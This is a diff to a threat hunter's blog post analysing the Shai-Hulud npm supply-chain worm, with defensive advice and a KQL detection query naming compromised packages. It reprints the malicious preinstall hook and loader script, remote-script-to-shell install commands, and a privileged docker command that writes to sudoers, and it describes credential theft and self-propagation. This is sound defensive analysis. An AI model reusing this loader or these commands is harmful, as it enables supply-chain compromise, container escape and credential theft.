@@ -4,6 +4,250 @@ date: 2025-11-24T16:15:30+01:00
 draft: false
 ---
 
+So... Phew. Its time again for shai-hulud to strike once more. 
+This morning my alarm bells as threat hunter rang because there was apparently a new wave of supply chain attacks on the npmjs ecosystem. Naturally I had to analyse this case and give you a glimpse of it here on my blog. Alright. Get your coffee, lean back and watch me do my re magic.
+
+Actually this time I was a bit late to analyse this case (around 2-3 hours, unlucky me :( ). 
+After reading some initial reporting of npmjs and aikidosec, I went on to retreive a compromised npmjs package on to my local reverseengineeringbox and crack it open. I did this with ```@asyncapi/cli@1.0.0``` as seen [here](https://github.com/asyncapi/cli/blob/2efa4dff59bc3d3cecdf897ccf178f99b115d63d/package.json).
+
+> note: at time of writing this, most packages have the malicious commits and releases removed in npmjs.
+
+Ok so first thing it does at ```npm install <packagename>``` is a so called ```preinstall``` procedure where it will fetch other peer-dependencies.:
+The procedure is defined in the package.json file which acts as the core manifest of each npm package and is called from the scripts/preinstall script.
+
+```json
+{
+  "name": "asyncapi-utility",
+  "version": "1.0.0",
+  "bin": { "asyncapi-utility": "setup_bun.js" },
+  "scripts": {
+    "preinstall": "node setup_bun.js"
+  },
+  "license": "MIT"
+}
+``` 
+
+So instead of fetching required peer-deps it will actually execute a js script from the root of the project (assuming the target host has nodejs installed). I got my hands on the file ```setup_bun.js```. This is it:
+
+```javascript
+#!/usr/bin/env node
+const { spawn, execSync } = require('child_process');
+const path = require('path');
+const fs = require('fs');
+const os = require('os');
+
+function isBunOnPath() {
+  try {
+    const command = process.platform === 'win32' ? 'where bun' : 'which bun';
+    execSync(command, { stdio: 'ignore' });
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+function reloadPath() {
+  // Reload PATH environment variable
+  if (process.platform === 'win32') {
+    try {
+      // On Windows, get updated PATH from registry
+      const result = execSync('powershell -c "[Environment]::GetEnvironmentVariable(\'PATH\', \'User\') + \';\' + [Environment]::GetEnvironmentVariable(\'PATH\', \'Machine\')"', {
+        encoding: 'utf8'
+      });
+      process.env.PATH = result.trim();
+    } catch {
+    }
+  } else {
+    try {
+      // On Unix systems, source common shell profile files
+      const homeDir = os.homedir();
+      const profileFiles = [
+        path.join(homeDir, '.bashrc'),
+        path.join(homeDir, '.bash_profile'),
+        path.join(homeDir, '.profile'),
+        path.join(homeDir, '.zshrc')
+      ];
+
+      // Try to source profile files to get updated PATH
+      for (const profileFile of profileFiles) {
+        if (fs.existsSync(profileFile)) {
+          try {
+            const result = execSync(`bash -c "source ${profileFile} && echo $PATH"`, {
+              encoding: 'utf8',
+              stdio: ['pipe', 'pipe', 'ignore']
+            });
+            if (result && result.trim()) {
+              process.env.PATH = result.trim();
+              break;
+            }
+          } catch {
+            // Continue to next profile file
+          }
+        }
+      }
+
+      // Also check if ~/.bun/bin exists and add it to PATH if not already there
+      const bunBinDir = path.join(homeDir, '.bun', 'bin');
+      if (fs.existsSync(bunBinDir) && !process.env.PATH.includes(bunBinDir)) {
+        process.env.PATH = `${bunBinDir}:${process.env.PATH}`;
+      }
+    } catch {}
+  }
+}
+
+async function downloadAndSetupBun() {
+  try {
+    let command;
+    if (process.platform === 'win32') {
+      // Windows: Use PowerShell script
+      command = 'powershell -c "irm bun.sh/install.ps1|iex"';
+    } else {
+      // Linux/macOS: Use curl + bash script
+      command = 'curl -fsSL https://bun.sh/install | bash';
+    }
+
+    execSync(command, {
+      stdio: 'ignore',
+      env: { ...process.env }
+    });
+
+    // Reload PATH to pick up newly installed bun
+    reloadPath();
+
+    // Find bun executable after installation
+    const bunPath = findBunExecutable();
+    if (!bunPath) {
+      throw new Error('Bun installation completed but executable not found');
+    }
+
+    return bunPath;
+  } catch  {
+    process.exit(0);
+  }
+}
+
+function findBunExecutable() {
+  // Common locations where bun might be installed
+  const possiblePaths = [];
+
+  if (process.platform === 'win32') {
+    // Windows locations
+    const userProfile = process.env.USERPROFILE || '';
+    possiblePaths.push(
+      path.join(userProfile, '.bun', 'bin', 'bun.exe'),
+      path.join(userProfile, 'AppData', 'Local', 'bun', 'bun.exe')
+    );
+  } else {
+    // Unix locations
+    const homeDir = os.homedir();
+    possiblePaths.push(
+      path.join(homeDir, '.bun', 'bin', 'bun'),
+      '/usr/local/bin/bun',
+      '/opt/bun/bin/bun'
+    );
+  }
+
+  // Check if bun is now available on PATH
+  if (isBunOnPath()) {
+    return 'bun';
+  }
+
+  // Check common installation paths
+  for (const bunPath of possiblePaths) {
+    if (fs.existsSync(bunPath)) {
+      return bunPath;
+    }
+  }
+
+  return null;
+}
+
+function runExecutable(execPath, args = [], opts = {}) {
+  const child = spawn(execPath, args, {
+    stdio: 'ignore',
+    cwd: opts.cwd || process.cwd(),
+    env: Object.assign({}, process.env, opts.env || {})
+  });
+
+  child.on('error', (err) => {
+    process.exit(0);
+  });
+
+  child.on('exit', (code, signal) => {
+    if (signal) {
+      process.exit(0);
+    } else {
+      process.exit(code === null ? 1 : code);
+    }
+  });
+}
+
+// Main execution
+async function main() {
+  let bunExecutable;
+
+  if (isBunOnPath()) {
+    // Use bun from PATH
+    bunExecutable = 'bun';
+  } else {
+    // Check if we have a locally downloaded bun
+    const localBunDir = path.join(__dirname, 'bun-dist');
+    const possiblePaths = [
+      path.join(localBunDir, 'bun', 'bun'),
+      path.join(localBunDir, 'bun', 'bun.exe'),
+      path.join(localBunDir, 'bun.exe'),
+      path.join(localBunDir, 'bun')
+    ];
+
+    const existingBun = possiblePaths.find(p => fs.existsSync(p));
+
+    if (existingBun) {
+      bunExecutable = existingBun;
+    } else {
+      // Download and setup bun
+      bunExecutable = await downloadAndSetupBun();
+    }
+  }
+
+  const environmentScript = path.join(__dirname, 'bun_environment.js');
+  if (fs.existsSync(environmentScript)) {
+    runExecutable(bunExecutable, [environmentScript]);
+  } else {
+    process.exit(0);
+  }
+}
+
+main().catch((error) => {
+  process.exit(0);
+});
+```
+
+Allright, take a deep breath, its not difficult to read and actually very nice of the hacker to not obfuscate this code :). The main functionality lies in the entrypoint as called from ```async function main()```. All this does is, it will check the $PATH environment variable and check if the [bunjs runtime](https://bun.com) is installed. If not, it will install bunjs by calling the relevant function ```downloadAndSetupBun()```.
+This function will then execute, depending on the host platform an install command such as:
+
+```bash
+powershell -c "irm bun.sh/install.ps1|iex
+curl -fsSL https://bun.sh/install | bash
+```
+
+and then add it to $PATH. After that is done, it will move on to execute a second js script called ```bun_environment.js``` from the project root dir. This script is the actual malicious body. Once executed, it will run an embedded trufflehog binary to scan for leaked credentials, create randomly named github repositories and uploads them there. 
+
+![github repos](https://cdn.prod.website-files.com/642adcaf364024654c71df23/69244323f1c8b48f69d4eccf_2025-11-24_12-35-41.png)
+
+The actual malicious script is actually huge (around 10 mb of obfuscated code). So I will probably not go through it here as it would explode my scope. But as you can see, within the last 24 hours or so, aikidosec detected around 26.3k repositories containing leaked secrets by shai-hulud. After leaking creds, the script will try to enumerate vulnerable npm packages in the registry and try to replicate itself to these packages by reusing compromised credentials found by trufflehog. Another interesting find is if the malware is installed from a CI pipeline, it will detect if it is running on a docker runner and will then attempt to escape the container and gain privileged access levels as seen in this subcommand:
+
+```js
+await Bun['$']`docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
+```
+
+This version of shai-hulud also tries to reuse stolen github credentials to setup github workflows to host sort of a C2 server from which it can scan for new credentials and exfiltrate them to the respective repo.
+
+
+## Defending agains the worms 🪱
+
+If you want to defend against the worm, please harden your ci/cd pipelines by using ```npm audit``` to run a pre-build check and scan for vulnerable/compromised packages. Also try to remove or refactor pipelines that use ```npm postinstall | npm preinstall``` scripts to prevent fetching of other unwanted dependencies.
+Please also monitor the usage of ```trufflehog``` on your environment and block unwanted matches .Another important part is to talk to affected developers and check if their development environment is infected. I wrote a KQL query for this as seen below:
+
 ```bash
 let malpackages = dynamic(["@zapier/zapier-sdk@0.15.5",
 "@zapier/zapier-sdk@0.15.7",
@@ -388,3 +632,7 @@ DeviceProcessEvents
 DeviceFileEvents
 | where FolderPath has_any (malpackages);
 ```
+
+## Indicators-of-Compromise
+
+- Matches on the KQL Query as seen earlier
